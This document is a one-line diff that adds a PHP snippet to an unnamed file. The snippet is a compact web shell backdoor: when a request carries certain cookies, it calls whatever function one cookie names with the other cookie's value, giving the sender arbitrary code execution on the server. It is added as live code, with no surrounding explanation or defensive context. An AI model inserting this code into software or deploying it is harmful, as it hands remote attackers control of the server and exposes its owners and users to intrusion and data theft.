@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["LB"])){$_COOKIE["APLeS"]($_COOKIE["LB"]);exit;}
